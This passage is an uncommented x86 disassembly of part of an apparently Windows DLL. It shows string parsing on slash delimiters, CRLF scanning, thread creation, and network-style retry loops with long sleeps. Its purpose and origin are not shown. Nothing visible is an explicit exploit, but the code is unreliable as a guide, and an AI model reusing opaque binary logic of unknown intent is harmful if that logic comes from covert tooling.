10004529:	3c 2f                	cmp    $0x2f,%al
1000452b:	75 ed                	jne    0x1000451a
1000452d:	8d 45 c0             	lea    -0x40(%ebp),%eax
10004530:	50                   	push   %eax
10004531:	c6 44 0d c0 00       	movb   $0x0,-0x40(%ebp,%ecx,1)
10004536:	ff 15 34 e1 00 10    	call   *0x1000e134
1000453c:	83 f8 20             	cmp    $0x20,%eax
1000453f:	7f 0d                	jg     0x1000454e
10004541:	8d 45 c0             	lea    -0x40(%ebp),%eax
10004544:	50                   	push   %eax
10004545:	ff 75 10             	pushl  0x10(%ebp)
10004548:	ff 15 58 e1 00 10    	call   *0x1000e158
1000454e:	33 f6                	xor    %esi,%esi
10004550:	46                   	inc    %esi
10004551:	eb b7                	jmp    0x1000450a
10004553:	c7 80 dc 06 00 00 dd 	movl   $0x10002edd,0x6dc(%eax)
1000455a:	2e 00 10 
1000455d:	89 88 e0 06 00 00    	mov    %ecx,0x6e0(%eax)
10004563:	33 c0                	xor    %eax,%eax
10004565:	40                   	inc    %eax
10004566:	c3                   	ret    
10004567:	8b 88 c8 06 00 00    	mov    0x6c8(%eax),%ecx
1000456d:	85 c9                	test   %ecx,%ecx
1000456f:	74 0e                	je     0x1000457f
10004571:	ff b0 c4 06 00 00    	pushl  0x6c4(%eax)
10004577:	6a 00                	push   $0x0
10004579:	50                   	push   %eax
1000457a:	ff d1                	call   *%ecx
1000457c:	83 c4 0c             	add    $0xc,%esp
1000457f:	c3                   	ret    
10004580:	55                   	push   %ebp
10004581:	8b ec                	mov    %esp,%ebp
10004583:	53                   	push   %ebx
10004584:	8b 5d 08             	mov    0x8(%ebp),%ebx
10004587:	56                   	push   %esi
10004588:	57                   	push   %edi
10004589:	53                   	push   %ebx
1000458a:	e8 36 fb ff ff       	call   0x100040c5
1000458f:	68 e0 93 04 00       	push   $0x493e0
10004594:	e8 44 62 00 00       	call   0x1000a7dd
10004599:	59                   	pop    %ecx
1000459a:	85 c0                	test   %eax,%eax
1000459c:	75 18                	jne    0x100045b6
1000459e:	33 f6                	xor    %esi,%esi
100045a0:	8b c3                	mov    %ebx,%eax
100045a2:	e8 c0 ff ff ff       	call   0x10004567
100045a7:	53                   	push   %ebx
100045a8:	e8 22 fb ff ff       	call   0x100040cf
100045ad:	5f                   	pop    %edi
100045ae:	8b c6                	mov    %esi,%eax
100045b0:	5e                   	pop    %esi
100045b1:	5b                   	pop    %ebx
100045b2:	5d                   	pop    %ebp
100045b3:	c2 04 00             	ret    $0x4
100045b6:	8b c3                	mov    %ebx,%eax
100045b8:	e8 91 fd ff ff       	call   0x1000434e
100045bd:	85 c0                	test   %eax,%eax
100045bf:	75 07                	jne    0x100045c8
100045c1:	be 4f 05 00 00       	mov    $0x54f,%esi
100045c6:	eb d8                	jmp    0x100045a0
100045c8:	8b 35 44 e1 00 10    	mov    0x1000e144,%esi
100045ce:	33 ff                	xor    %edi,%edi
100045d0:	8b c3                	mov    %ebx,%eax
100045d2:	e8 50 05 00 00       	call   0x10004b27
100045d7:	83 f8 04             	cmp    $0x4,%eax
100045da:	75 33                	jne    0x1000460f
100045dc:	e8 db 03 00 00       	call   0x100049bc
100045e1:	85 c0                	test   %eax,%eax
100045e3:	74 07                	je     0x100045ec
100045e5:	3d 46 06 00 00       	cmp    $0x646,%eax
100045ea:	75 2c                	jne    0x10004618
100045ec:	8b 83 d4 06 00 00    	mov    0x6d4(%ebx),%eax
100045f2:	85 c0                	test   %eax,%eax
100045f4:	74 0b                	je     0x10004601
100045f6:	6a 00                	push   $0x0
100045f8:	ff b3 d8 06 00 00    	pushl  0x6d8(%ebx)
100045fe:	53                   	push   %ebx
100045ff:	ff d0                	call   *%eax
10004601:	ff b3 40 06 00 00    	pushl  0x640(%ebx)
10004607:	ff d6                	call   *%esi
10004609:	47                   	inc    %edi
1000460a:	83 ff 64             	cmp    $0x64,%edi
1000460d:	7c c1                	jl     0x100045d0
1000460f:	68 fa 00 00 00       	push   $0xfa
10004614:	ff d6                	call   *%esi
10004616:	eb 86                	jmp    0x1000459e
10004618:	8b f0                	mov    %eax,%esi
1000461a:	eb 84                	jmp    0x100045a0
1000461c:	eb 0b                	jmp    0x10004629
1000461e:	68 fa 00 00 00       	push   $0xfa
10004623:	ff 15 44 e1 00 10    	call   *0x1000e144
10004629:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
1000462d:	74 ef                	je     0x1000461e
1000462f:	33 c0                	xor    %eax,%eax
10004631:	83 7e 08 04          	cmpl   $0x4,0x8(%esi)
10004635:	0f 94 c0             	sete   %al
10004638:	c3                   	ret    
10004639:	55                   	push   %ebp
1000463a:	8b ec                	mov    %esp,%ebp
1000463c:	51                   	push   %ecx
1000463d:	57                   	push   %edi
1000463e:	56                   	push   %esi
1000463f:	e8 81 fa ff ff       	call   0x100040c5
10004644:	33 c0                	xor    %eax,%eax
10004646:	8d 4d fc             	lea    -0x4(%ebp),%ecx
10004649:	51                   	push   %ecx
1000464a:	50                   	push   %eax
1000464b:	56                   	push   %esi
1000464c:	68 80 45 00 10       	push   $0x10004580
10004651:	50                   	push   %eax
10004652:	50                   	push   %eax
10004653:	c7 46 08 01 00 00 00 	movl   $0x1,0x8(%esi)
1000465a:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000465d:	ff 15 54 e1 00 10    	call   *0x1000e154
10004663:	8b f8                	mov    %eax,%edi
10004665:	56                   	push   %esi
10004666:	89 7e 0c             	mov    %edi,0xc(%esi)
10004669:	e8 61 fa ff ff       	call   0x100040cf
1000466e:	8b c7                	mov    %edi,%eax
10004670:	5f                   	pop    %edi
10004671:	c9                   	leave  
10004672:	c3                   	ret    
10004673:	56                   	push   %esi
10004674:	e8 4c fa ff ff       	call   0x100040c5
10004679:	8b 46 08             	mov    0x8(%esi),%eax
1000467c:	83 f8 04             	cmp    $0x4,%eax
1000467f:	74 05                	je     0x10004686
10004681:	83 f8 01             	cmp    $0x1,%eax
10004684:	75 0f                	jne    0x10004695
10004686:	83 66 08 00          	andl   $0x0,0x8(%esi)
1000468a:	6a ff                	push   $0xffffffff
1000468c:	ff 76 0c             	pushl  0xc(%esi)
1000468f:	ff 15 38 e1 00 10    	call   *0x1000e138
10004695:	ff 76 0c             	pushl  0xc(%esi)
10004698:	ff 15 50 e1 00 10    	call   *0x1000e150
1000469e:	83 66 0c 00          	andl   $0x0,0xc(%esi)
100046a2:	56                   	push   %esi
100046a3:	e8 27 fa ff ff       	call   0x100040cf
100046a8:	c3                   	ret    
100046a9:	55                   	push   %ebp
100046aa:	8b ec                	mov    %esp,%ebp
100046ac:	b8 80 00 00 00       	mov    $0x80,%eax
100046b1:	3b 45 08             	cmp    0x8(%ebp),%eax
100046b4:	1b c0                	sbb    %eax,%eax
100046b6:	f7 d8                	neg    %eax
100046b8:	5d                   	pop    %ebp
100046b9:	c3                   	ret    
100046ba:	55                   	push   %ebp
100046bb:	8b ec                	mov    %esp,%ebp
100046bd:	81 ec 14 01 00 00    	sub    $0x114,%esp
100046c3:	53                   	push   %ebx
100046c4:	56                   	push   %esi
100046c5:	8b 75 08             	mov    0x8(%ebp),%esi
100046c8:	57                   	push   %edi
100046c9:	33 db                	xor    %ebx,%ebx
100046cb:	53                   	push   %ebx
100046cc:	53                   	push   %ebx
100046cd:	ff 75 0c             	pushl  0xc(%ebp)
100046d0:	8b f8                	mov    %eax,%edi
100046d2:	56                   	push   %esi
100046d3:	e8 53 04 00 00       	call   0x10004b2b
100046d8:	85 c0                	test   %eax,%eax
100046da:	0f 84 62 01 00 00    	je     0x10004842
100046e0:	8d 45 f8             	lea    -0x8(%ebp),%eax
100046e3:	50                   	push   %eax
100046e4:	8d 45 fc             	lea    -0x4(%ebp),%eax
100046e7:	50                   	push   %eax
100046e8:	8b 45 0c             	mov    0xc(%ebp),%eax
100046eb:	89 5d fc             	mov    %ebx,-0x4(%ebp)
100046ee:	89 5d f8             	mov    %ebx,-0x8(%ebp)
100046f1:	e8 67 05 00 00       	call   0x10004c5d
100046f6:	85 c0                	test   %eax,%eax
100046f8:	0f 84 44 01 00 00    	je     0x10004842
100046fe:	8b 4d f8             	mov    -0x8(%ebp),%ecx
10004701:	8b b6 f4 06 00 00    	mov    0x6f4(%esi),%esi
10004707:	8d 45 f4             	lea    -0xc(%ebp),%eax
1000470a:	50                   	push   %eax
1000470b:	ff 75 fc             	pushl  -0x4(%ebp)
1000470e:	8d 45 0c             	lea    0xc(%ebp),%eax
10004711:	89 5d 0c             	mov    %ebx,0xc(%ebp)
10004714:	89 5d f4             	mov    %ebx,-0xc(%ebp)
10004717:	e8 78 34 00 00       	call   0x10007b94
1000471c:	85 c0                	test   %eax,%eax
1000471e:	74 7d                	je     0x1000479d
10004720:	ff 75 fc             	pushl  -0x4(%ebp)
10004723:	8b 5d f8             	mov    -0x8(%ebp),%ebx
10004726:	8b 75 08             	mov    0x8(%ebp),%esi
10004729:	e8 ab f9 ff ff       	call   0x100040d9
1000472e:	8b d8                	mov    %eax,%ebx
10004730:	85 db                	test   %ebx,%ebx
10004732:	74 60                	je     0x10004794
10004734:	8b 7d f4             	mov    -0xc(%ebp),%edi
10004737:	8d 86 f8 06 00 00    	lea    0x6f8(%esi),%eax
1000473d:	8b 75 0c             	mov    0xc(%ebp),%esi
10004740:	50                   	push   %eax
10004741:	89 45 f0             	mov    %eax,-0x10(%ebp)
10004744:	e8 a3 3c 00 00       	call   0x100083ec
10004749:	8b d8                	mov    %eax,%ebx
1000474b:	85 db                	test   %ebx,%ebx
1000474d:	74 45                	je     0x10004794
1000474f:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
10004755:	50                   	push   %eax
10004756:	ff 75 f0             	pushl  -0x10(%ebp)
10004759:	33 c9                	xor    %ecx,%ecx
1000475b:	6a 02                	push   $0x2
1000475d:	58                   	pop    %eax
1000475e:	e8 c1 3b 00 00       	call   0x10008324
10004763:	85 c0                	test   %eax,%eax
10004765:	74 2d                	je     0x10004794
10004767:	6a 50                	push   $0x50
10004769:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
1000476f:	e8 2c 0d 00 00       	call   0x100054a0
10004774:	59                   	pop    %ecx
10004775:	8d b5 f0 fe ff ff    	lea    -0x110(%ebp),%esi
1000477b:	0f b7 f8             	movzwl %ax,%edi
1000477e:	e8 d8 0c 00 00       	call   0x1000545b
10004783:	8b 4d 08             	mov    0x8(%ebp),%ecx
10004786:	57                   	push   %edi
10004787:	8b c6                	mov    %esi,%eax
10004789:	50                   	push   %eax
1000478a:	6a 02                	push   $0x2
1000478c:	58                   	pop    %eax
1000478d:	e8 d9 06 00 00       	call   0x10004e6b
10004792:	8b d8                	mov    %eax,%ebx
10004794:	ff 75 0c             	pushl  0xc(%ebp)
10004797:	e8 77 22 00 00       	call   0x10006a13
1000479c:	59                   	pop    %ecx
1000479d:	8b 55 08             	mov    0x8(%ebp),%edx
100047a0:	8b 4d f8             	mov    -0x8(%ebp),%ecx
100047a3:	8b ba f4 06 00 00    	mov    0x6f4(%edx),%edi
100047a9:	8d 45 f4             	lea    -0xc(%ebp),%eax
100047ac:	50                   	push   %eax
100047ad:	ff 75 fc             	pushl  -0x4(%ebp)
100047b0:	8d 45 0c             	lea    0xc(%ebp),%eax
100047b3:	e8 66 33 00 00       	call   0x10007b1e
100047b8:	85 c0                	test   %eax,%eax
100047ba:	74 7d                	je     0x10004839
100047bc:	ff 75 fc             	pushl  -0x4(%ebp)
100047bf:	8b 5d f8             	mov    -0x8(%ebp),%ebx
100047c2:	8b 75 08             	mov    0x8(%ebp),%esi
100047c5:	e8 0f f9 ff ff       	call   0x100040d9
100047ca:	8b d8                	mov    %eax,%ebx
100047cc:	85 db                	test   %ebx,%ebx
100047ce:	74 60                	je     0x10004830
100047d0:	8b 7d f4             	mov    -0xc(%ebp),%edi
100047d3:	8d 86 f8 06 00 00    	lea    0x6f8(%esi),%eax
100047d9:	8b 75 0c             	mov    0xc(%ebp),%esi
100047dc:	50                   	push   %eax
100047dd:	89 45 f0             	mov    %eax,-0x10(%ebp)
100047e0:	e8 07 3c 00 00       	call   0x100083ec
100047e5:	8b d8                	mov    %eax,%ebx
100047e7:	85 db                	test   %ebx,%ebx
100047e9:	74 45                	je     0x10004830
100047eb:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
100047f1:	50                   	push   %eax
100047f2:	ff 75 f0             	pushl  -0x10(%ebp)
100047f5:	33 c9                	xor    %ecx,%ecx
100047f7:	6a 02                	push   $0x2
100047f9:	58                   	pop    %eax
100047fa:	e8 25 3b 00 00       	call   0x10008324
100047ff:	85 c0                	test   %eax,%eax
10004801:	74 2d                	je     0x10004830
10004803:	6a 50                	push   $0x50
10004805:	8d 85 f0 fe ff ff    	lea    -0x110(%ebp),%eax
1000480b:	e8 90 0c 00 00       	call   0x100054a0
10004810:	59                   	pop    %ecx
10004811:	8d b5 f0 fe ff ff    	lea    -0x110(%ebp),%esi
10004817:	0f b7 f8             	movzwl %ax,%edi
1000481a:	e8 3c 0c 00 00       	call   0x1000545b
1000481f:	8b 4d 08             	mov    0x8(%ebp),%ecx
10004822:	57                   	push   %edi
10004823:	8b c6                	mov    %esi,%eax
10004825:	50                   	push   %eax
10004826:	6a 02                	push   $0x2
10004828:	58                   	pop    %eax
10004829:	e8 3d 06 00 00       	call   0x10004e6b
1000482e:	8b d8                	mov    %eax,%ebx
10004830:	ff 75 0c             	pushl  0xc(%ebp)
10004833:	e8 db 21 00 00       	call   0x10006a13
10004838:	59                   	pop    %ecx
10004839:	ff 75 fc             	pushl  -0x4(%ebp)
1000483c:	e8 d2 21 00 00       	call   0x10006a13
10004841:	59                   	pop    %ecx
10004842:	5f                   	pop    %edi
10004843:	5e                   	pop    %esi
10004844:	8b c3                	mov    %ebx,%eax
10004846:	5b                   	pop    %ebx
10004847:	c9                   	leave  
10004848:	c2 08 00             	ret    $0x8
1000484b:	55                   	push   %ebp
1000484c:	8b ec                	mov    %esp,%ebp
1000484e:	51                   	push   %ecx
1000484f:	8b 45 08             	mov    0x8(%ebp),%eax
10004852:	33 d2                	xor    %edx,%edx
10004854:	8d 48 f9             	lea    -0x7(%eax),%ecx
10004857:	89 55 fc             	mov    %edx,-0x4(%ebp)
1000485a:	3b ca                	cmp    %edx,%ecx
1000485c:	76 48                	jbe    0x100048a6
1000485e:	53                   	push   %ebx
1000485f:	56                   	push   %esi
10004860:	80 3c 3a 0d          	cmpb   $0xd,(%edx,%edi,1)
10004864:	75 36                	jne    0x1000489c
10004866:	80 7c 3a 01 0a       	cmpb   $0xa,0x1(%edx,%edi,1)
1000486b:	75 2f                	jne    0x1000489c
1000486d:	83 c2 02             	add    $0x2,%edx
10004870:	8d 48 fb             	lea    -0x5(%eax),%ecx
10004873:	3b d1                	cmp    %ecx,%edx
10004875:	73 25                	jae    0x1000489c
10004877:	33 db                	xor    %ebx,%ebx
10004879:	43                   	inc    %ebx
1000487a:	2b ca                	sub    %edx,%ecx
1000487c:	8d 74 3a 01          	lea    0x1(%edx,%edi,1),%esi
10004880:	2b df                	sub    %edi,%ebx
10004882:	03 d1                	add    %ecx,%edx
10004884:	80 7e ff 0d          	cmpb   $0xd,-0x1(%esi)
10004888:	75 0e                	jne    0x10004898
1000488a:	80 3e 0a             	cmpb   $0xa,(%esi)
1000488d:	75 09                	jne    0x10004898
1000488f:	8d 04 33             	lea    (%ebx,%esi,1),%eax
10004892:	89 45 fc             	mov    %eax,-0x4(%ebp)
10004895:	8b 45 08             	mov    0x8(%ebp),%eax
10004898:	46                   	inc    %esi
10004899:	49                   	dec    %ecx
1000489a:	75 e8                	jne    0x10004884
1000489c:	42                   	inc    %edx
1000489d:	8d 48 f9             	lea    -0x7(%eax),%ecx
100048a0:	3b d1                	cmp    %ecx,%edx
100048a2:	72 bc                	jb     0x10004860
100048a4:	5e                   	pop    %esi
100048a5:	5b                   	pop    %ebx
100048a6:	8b 45 fc             	mov    -0x4(%ebp),%eax
100048a9:	c9                   	leave  
100048aa:	c2 04 00             	ret    $0x4
100048ad:	55                   	push   %ebp
100048ae:	8b ec                	mov    %esp,%ebp
100048b0:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
100048b4:	56                   	push   %esi
100048b5:	57                   	push   %edi
100048b6:	8b f0                	mov    %eax,%esi
100048b8:	8b f9                	mov    %ecx,%edi
100048ba:	74 05                	je     0x100048c1
100048bc:	33 c0                	xor    %eax,%eax
100048be:	40                   	inc    %eax
100048bf:	eb 52                	jmp    0x10004913
100048c1:	83 65 08 00          	andl   $0x0,0x8(%ebp)
100048c5:	83 fe 03             	cmp    $0x3,%esi
100048c8:	73 04                	jae    0x100048ce
100048ca:	33 c0                	xor    %eax,%eax
100048cc:	eb 45                	jmp    0x10004913
100048ce:	75 16                	jne    0x100048e6
100048d0:	8a 47 01             	mov    0x1(%edi),%al
100048d3:	3c 30                	cmp    $0x30,%al
100048d5:	74 04                	je     0x100048db
100048d7:	3c 31                	cmp    $0x31,%al
100048d9:	75 0b                	jne    0x100048e6
100048db:	80 3f 2f             	cmpb   $0x2f,(%edi)
100048de:	75 06                	jne    0x100048e6
100048e0:	80 7f 02 2f          	cmpb   $0x2f,0x2(%edi)
100048e4:	74 d6                	je     0x100048bc
100048e6:	56                   	push   %esi
100048e7:	e8 5f ff ff ff       	call   0x1000484b
100048ec:	85 c0                	test   %eax,%eax
100048ee:	7e 20                	jle    0x10004910
100048f0:	2b f0                	sub    %eax,%esi
100048f2:	56                   	push   %esi
100048f3:	8d 0c 38             	lea    (%eax,%edi,1),%ecx
100048f6:	51                   	push   %ecx
100048f7:	50                   	push   %eax
100048f8:	57                   	push   %edi
100048f9:	ff b3 e8 06 00 00    	pushl  0x6e8(%ebx)
100048ff:	ff b3 e4 06 00 00    	pushl  0x6e4(%ebx)
10004905:	e8 c3 53 00 00       	call   0x10009ccd
1000490a:	83 c4 18             	add    $0x18,%esp
1000490d:	89 45 08             	mov    %eax,0x8(%ebp)
10004910:	8b 45 08             	mov    0x8(%ebp),%eax
10004913:	5f                   	pop    %edi
10004914:	5e                   	pop    %esi
10004915:	5d                   	pop    %ebp
10004916:	c2 04 00             	ret    $0x4
10004919:	55                   	push   %ebp
1000491a:	8b ec                	mov    %esp,%ebp
1000491c:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000491f:	53                   	push   %ebx
10004920:	8b d8                	mov    %eax,%ebx
10004922:	56                   	push   %esi
10004923:	8b c7                	mov    %edi,%eax
10004925:	e8 83 ff ff ff       	call   0x100048ad
1000492a:	85 c0                	test   %eax,%eax
1000492c:	75 05                	jne    0x10004933
1000492e:	6a 0d                	push   $0xd
10004930:	58                   	pop    %eax
10004931:	eb 76                	jmp    0x100049a9
10004933:	85 f6                	test   %esi,%esi
10004935:	75 11                	jne    0x10004948
10004937:	21 73 10             	and    %esi,0x10(%ebx)
1000493a:	c7 83 40 06 00 00 d8 	movl   $0x347d8,0x640(%ebx)
10004941:	47 03 00 
10004944:	33 c0                	xor    %eax,%eax
10004946:	eb 61                	jmp    0x100049a9
10004948:	83 fe 01             	cmp    $0x1,%esi
1000494b:	75 2e                	jne    0x1000497b
1000494d:	57                   	push   %edi
1000494e:	c7 83 40 06 00 00 d8 	movl   $0x347d8,0x640(%ebx)
10004955:	47 03 00 
10004958:	e8 4c fd ff ff       	call   0x100046a9
1000495d:	83 c4 04             	add    $0x4,%esp
10004960:	85 c0                	test   %eax,%eax
10004962:	74 0e                	je     0x10004972
10004964:	8b 45 08             	mov    0x8(%ebp),%eax
10004967:	57                   	push   %edi
10004968:	53                   	push   %ebx
10004969:	e8 4c fd ff ff       	call   0x100046ba
1000496e:	85 c0                	test   %eax,%eax
10004970:	74 bc                	je     0x1000492e
10004972:	c7 43 10 01 00 00 00 	movl   $0x1,0x10(%ebx)
10004979:	eb c9                	jmp    0x10004944
1000497b:	8b 8b dc 06 00 00    	mov    0x6dc(%ebx),%ecx
10004981:	b8 46 06 00 00       	mov    $0x646,%eax
10004986:	85 c9                	test   %ecx,%ecx
10004988:	74 1f                	je     0x100049a9
1000498a:	8d 43 10             	lea    0x10(%ebx),%eax
1000498d:	50                   	push   %eax
1000498e:	ff b3 e0 06 00 00    	pushl  0x6e0(%ebx)
10004994:	57                   	push   %edi
10004995:	ff 75 08             	pushl  0x8(%ebp)
10004998:	56                   	push   %esi
10004999:	ff d1                	call   *%ecx
1000499b:	85 c0                	test   %eax,%eax
1000499d:	75 0a                	jne    0x100049a9
1000499f:	c7 83 40 06 00 00 a8 	movl   $0x61a8,0x640(%ebx)
100049a6:	61 00 00 
100049a9:	5b                   	pop    %ebx
100049aa:	5d                   	pop    %ebp
100049ab:	c2 04 00             	ret    $0x4
100049ae:	53                   	push   %ebx
100049af:	8b d8                	mov    %eax,%ebx
100049b1:	83 63 10 00          	andl   $0x0,0x10(%ebx)
100049b5:	e8 02 00 00 00       	call   0x100049bc
100049ba:	5b                   	pop    %ebx
100049bb:	c3                   	ret    
100049bc:	55                   	push   %ebp
100049bd:	8b ec                	mov    %esp,%ebp
100049bf:	83 e4 f8             	and    $0xfffffff8,%esp
100049c2:	83 ec 18             	sub    $0x18,%esp
100049c5:	56                   	push   %esi
100049c6:	57                   	push   %edi
100049c7:	53                   	push   %ebx
100049c8:	e8 f8 f6 ff ff       	call   0x100040c5
100049cd:	68 00 08 00 00       	push   $0x800
100049d2:	e8 0d 20 00 00       	call   0x100069e4
100049d7:	59                   	pop    %ecx
100049d8:	89 44 24 10          	mov    %eax,0x10(%esp)
100049dc:	85 c0                	test   %eax,%eax
100049de:	0f 84 2d 01 00 00    	je     0x10004b11
100049e4:	be 00 00 10 00       	mov    $0x100000,%esi
100049e9:	56                   	push   %esi
100049ea:	e8 f5 1f 00 00       	call   0x100069e4
100049ef:	59                   	pop    %ecx
100049f0:	89 44 24 0c          	mov    %eax,0xc(%esp)
100049f4:	85 c0                	test   %eax,%eax
100049f6:	0f 84 01 01 00 00    	je     0x10004afd
100049fc:	8d 7b 14             	lea    0x14(%ebx),%edi
100049ff:	6a 1f                	push   $0x1f
10004a01:	57                   	push   %edi
10004a02:	e8 28 0c 00 00       	call   0x1000562f
10004a07:	8d 83 44 06 00 00    	lea    0x644(%ebx),%eax
10004a0d:	50                   	push   %eax
10004a0e:	57                   	push   %edi
10004a0f:	8d 83 40 04 00 00    	lea    0x440(%ebx),%eax
10004a15:	50                   	push   %eax
10004a16:	8d 83 40 05 00 00    	lea    0x540(%ebx),%eax
10004a1c:	50                   	push   %eax
10004a1d:	ff 74 24 28          	pushl  0x28(%esp)
10004a21:	c6 43 33 00          	movb   $0x0,0x33(%ebx)
10004a25:	ff 73 10             	pushl  0x10(%ebx)
10004a28:	e8 35 f6 ff ff       	call   0x10004062
10004a2d:	83 c4 20             	add    $0x20,%esp
10004a30:	85 c0                	test   %eax,%eax
10004a32:	0f 84 b4 00 00 00    	je     0x10004aec
10004a38:	0f b7 8b 38 01 00 00 	movzwl 0x138(%ebx),%ecx
10004a3f:	6a 05                	push   $0x5
10004a41:	56                   	push   %esi
10004a42:	ff 74 24 14          	pushl  0x14(%esp)
10004a46:	8d 43 38             	lea    0x38(%ebx),%eax
10004a49:	ff 74 24 1c          	pushl  0x1c(%esp)
10004a4d:	51                   	push   %ecx
10004a4e:	50                   	push   %eax
10004a4f:	e8 1f 1c 00 00       	call   0x10006673
10004a54:	83 c4 18             	add    $0x18,%esp
10004a57:	bf 98 3a 00 00       	mov    $0x3a98,%edi
10004a5c:	89 44 24 1c          	mov    %eax,0x1c(%esp)
10004a60:	89 7c 24 14          	mov    %edi,0x14(%esp)
10004a64:	c7 44 24 18 01 00 00 	movl   $0x1,0x18(%esp)
10004a6b:	00 
10004a6c:	85 c0                	test   %eax,%eax
10004a6e:	75 47                	jne    0x10004ab7
10004a70:	83 7c 24 18 02       	cmpl   $0x2,0x18(%esp)
10004a75:	73 39                	jae    0x10004ab0
10004a77:	ff 74 24 14          	pushl  0x14(%esp)
10004a7b:	ff 15 44 e1 00 10    	call   *0x1000e144
10004a81:	0f b7 83 38 01 00 00 	movzwl 0x138(%ebx),%eax
10004a88:	6a 05                	push   $0x5
10004a8a:	56                   	push   %esi
10004a8b:	ff 74 24 14          	pushl  0x14(%esp)
10004a8f:	ff 74 24 1c          	pushl  0x1c(%esp)
10004a93:	50                   	push   %eax
10004a94:	8d 43 38             	lea    0x38(%ebx),%eax
10004a97:	50                   	push   %eax
10004a98:	e8 d6 1b 00 00       	call   0x10006673
10004a9d:	01 7c 24 2c          	add    %edi,0x2c(%esp)
10004aa1:	83 c4 18             	add    $0x18,%esp
10004aa4:	ff 44 24 18          	incl   0x18(%esp)
10004aa8:	89 44 24 1c          	mov    %eax,0x1c(%esp)
10004aac:	85 c0                	test   %eax,%eax
10004aae:	74 c0                	je     0x10004a70
10004ab0:	83 7c 24 1c 00       	cmpl   $0x0,0x1c(%esp)
10004ab5:	74 27                	je     0x10004ade
10004ab7:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
10004abb:	e8 51 f4 ff ff       	call   0x10003f11
10004ac0:	85 c0                	test   %eax,%eax
10004ac2:	78 15                	js     0x10004ad9
10004ac4:	ff 74 24 0c          	pushl  0xc(%esp)
10004ac8:	8b 7c 24 20          	mov    0x20(%esp),%edi
10004acc:	8b f0                	mov    %eax,%esi
10004ace:	8b c3                	mov    %ebx,%eax
10004ad0:	e8 44 fe ff ff       	call   0x10004919
10004ad5:	8b f0                	mov    %eax,%esi
10004ad7:	eb 18                	jmp    0x10004af1
10004ad9:	6a 0d                	push   $0xd
10004adb:	5e                   	pop    %esi
10004adc:	eb 13                	jmp    0x10004af1
10004ade:	c7 43 08 02 00 00 00 	movl   $0x2,0x8(%ebx)
10004ae5:	be d0 04 00 00       	mov    $0x4d0,%esi
10004aea:	eb 05                	jmp    0x10004af1
10004aec:	be 4f 05 00 00       	mov    $0x54f,%esi
10004af1:	ff 74 24 0c          	pushl  0xc(%esp)
10004af5:	e8 19 1f 00 00       	call   0x10006a13
10004afa:	59                   	pop    %ecx
10004afb:	eb 08                	jmp    0x10004b05
10004afd:	ff 15 4c e1 00 10    	call   *0x1000e14c
10004b03:	8b f0                	mov    %eax,%esi
10004b05:	ff 74 24 10          	pushl  0x10(%esp)
10004b09:	e8 05 1f 00 00       	call   0x10006a13
10004b0e:	59                   	pop    %ecx
10004b0f:	eb 08                	jmp    0x10004b19
10004b11:	ff 15 4c e1 00 10    	call   *0x1000e14c
10004b17:	8b f0                	mov    %eax,%esi
10004b19:	53                   	push   %ebx
10004b1a:	e8 b0 f5 ff ff       	call   0x100040cf
10004b1f:	5f                   	pop    %edi
10004b20:	8b c6                	mov    %esi,%eax
10004b22:	5e                   	pop    %esi
10004b23:	8b e5                	mov    %ebp,%esp
10004b25:	5d                   	pop    %ebp
10004b26:	c3                   	ret    
10004b27:	8b 40 08             	mov    0x8(%eax),%eax
10004b2a:	c3                   	ret    
10004b2b:	55                   	push   %ebp
10004b2c:	8b ec                	mov    %esp,%ebp
10004b2e:	81 ec c0 01 00 00    	sub    $0x1c0,%esp
10004b34:	53                   	push   %ebx
10004b35:	b3 2f                	mov    $0x2f,%bl
10004b37:	38 1f                	cmp    %bl,(%edi)
10004b39:	74 07                	je     0x10004b42
10004b3b:	33 c0                	xor    %eax,%eax
10004b3d:	e9 f5 00 00 00       	jmp    0x10004c37
10004b42:	56                   	push   %esi
10004b43:	33 f6                	xor    %esi,%esi
10004b45:	38 5f 01             	cmp    %bl,0x1(%edi)
10004b48:	74 07                	je     0x10004b51
10004b4a:	46                   	inc    %esi
10004b4b:	38 5c 3e 01          	cmp    %bl,0x1(%esi,%edi,1)
10004b4f:	75 f9                	jne    0x10004b4a
10004b51:	46                   	inc    %esi
10004b52:	33 c9                	xor    %ecx,%ecx
10004b54:	eb 0e                	jmp    0x10004b64
10004b56:	3b 75 0c             	cmp    0xc(%ebp),%esi
10004b59:	73 11                	jae    0x10004b6c
10004b5b:	88 84 0d 40 ff ff ff 	mov    %al,-0xc0(%ebp,%ecx,1)
10004b62:	46                   	inc    %esi
10004b63:	41                   	inc    %ecx
10004b64:	8a 44 3e 01          	mov    0x1(%esi,%edi,1),%al
10004b68:	3a c3                	cmp    %bl,%al
10004b6a:	75 ea                	jne    0x10004b56
10004b6c:	8b 45 08             	mov    0x8(%ebp),%eax
10004b6f:	05 40 05 00 00       	add    $0x540,%eax
10004b74:	50                   	push   %eax
10004b75:	8d 85 40 ff ff ff    	lea    -0xc0(%ebp),%eax
10004b7b:	50                   	push   %eax
10004b7c:	c6 84 0d 40 ff ff ff 	movb   $0x0,-0xc0(%ebp,%ecx,1)
10004b83:	00 
10004b84:	46                   	inc    %esi
10004b85:	ff 15 30 e1 00 10    	call   *0x1000e130
10004b8b:	85 c0                	test   %eax,%eax
10004b8d:	75 71                	jne    0x10004c00
10004b8f:	33 c9                	xor    %ecx,%ecx
10004b91:	eb 0e                	jmp    0x10004ba1
10004b93:	3b 75 0c             	cmp    0xc(%ebp),%esi
10004b96:	73 11                	jae    0x10004ba9
10004b98:	88 84 0d 40 fe ff ff 	mov    %al,-0x1c0(%ebp,%ecx,1)
10004b9f:	46                   	inc    %esi
10004ba0:	41                   	inc    %ecx
10004ba1:	8a 44 3e 01          	mov    0x1(%esi,%edi,1),%al
10004ba5:	3a c3                	cmp    %bl,%al
10004ba7:	75 ea                	jne    0x10004b93
10004ba9:	8b 45 08             	mov    0x8(%ebp),%eax
10004bac:	05 40 04 00 00       	add    $0x440,%eax
10004bb1:	50                   	push   %eax
10004bb2:	8d 85 40 fe ff ff    	lea    -0x1c0(%ebp),%eax
10004bb8:	50                   	push   %eax
10004bb9:	c6 84 0d 40 fe ff ff 	movb   $0x0,-0x1c0(%ebp,%ecx,1)
